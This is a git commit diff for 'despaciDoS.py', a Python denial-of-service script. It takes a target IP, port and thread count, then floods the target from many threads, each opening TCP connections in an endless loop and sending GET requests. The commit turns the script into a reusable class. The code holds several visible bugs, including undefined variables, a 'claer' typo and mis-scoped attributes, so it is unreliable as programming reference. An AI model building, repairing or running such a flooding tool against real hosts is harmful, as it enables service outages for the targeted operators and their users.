781a0cbeac6d60b1149b28c2f9e50375361cac57
c0dehard <47797039+c0dehard@users.noreply.github.com>
2020-03-03 21:36:19 +0100

    Heavy Update, not fully tested  yet
    created a module with a class that runs as a standalone CLI script you can also import it and just call it by method

--- despaciDoS.py
+++ despaciDoS.py
@@ -1,30 +1,54 @@
 import os
 import socket
 from threading import Thread
-host = input("IP: ")
-ip = host
-port = int(input("Port: "))
-thread = int(input("Threads: "))
-usertext = str(input("Message: "))
 
+class despaciDoS:
 
+    #TODO TEST N FIX
 
-def dos():
-    while True:
-        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            
-            mysocket.connect((ip, port))
-            mysocket.send(str.encode("GET "+nachricht+"HTTP/1.1\r\n"))
-            mysocket.sendto(str.encode("GET "+nachricht+"HTTP/1.1\r\n"), (ip, port))
-        except socket.error:
-            os.system("cls")# 'clear' für unix!
-         
-            print("Error: "+str(errorc)+" | Total Threads: "+str(counter)) #todo fix counter displayng
-        mysocket.close()
-for i in range(thread): 
-    t = Thread(target=dos)
-    counter = counter+1
-    t.start()
+    def __init__(self,ip=0,port=0,thread=0,usertext=None):
+        """
+        Make sure your port is between 0 and 65535
+        """
+        self._ip = ip
+        self._port = port
+        self._thread = thread
+        self._usertext = usertext
+        if self._port > 65535:
+            self._port = 65535
+        if self._port < 0:
+            self.port = 0
 
+    def setTargetViaCLI(self):
+        _ip = input("IP: ")
+        _port = int(input("Port: "))
+        _thread = int(input("Threads: "))
+        _usertext = str(input("Message: "))
 
+    def startDoS(self):
+        def dosLogic(self):
+            """
+            This method will be executed as thread
+            """
+            while True:
+                mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                try:
+                    mysocket.connect((_ip, _port))
+                    mysocket.send(str.encode("GET "+despaciDoS._usertext+"HTTP/1.1\r\n"))
+                    mysocket.sendto(str.encode("GET "+despaciDoS._usertext+"HTTP/1.1\r\n"), (_ip, _port))
+                except socket.error:
+                    os.system('claer'if os.name != 'nt' else 'cls')
+                    print('Error')
+                mysocket.close()
+        for i in range(_thread): 
+            t = Thread(target=dosLogic)
+            t.start()
+
+if __name__ == "__main__":
+    """
+    If this module is called via Terminal/CMD
+    the main will be executed
+    else just make objects out of it when imported
+    """
+    x = despaciDoS()
+    x.setTargetViaCLI()
